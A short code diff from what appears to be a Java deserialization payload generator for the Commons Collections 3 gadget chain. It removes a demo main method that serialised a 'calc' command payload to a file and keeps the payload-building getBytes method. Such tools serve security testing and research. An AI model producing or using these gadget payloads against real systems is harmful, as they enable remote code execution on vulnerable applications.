@@ -12,19 +12,12 @@ import org.apache.commons.collections.map.LazyMap;
 
 import javax.xml.transform.Templates;
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
 public class CommonsCollections3 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object tpl = Gadgets.createTemplatesImpl(type, param);
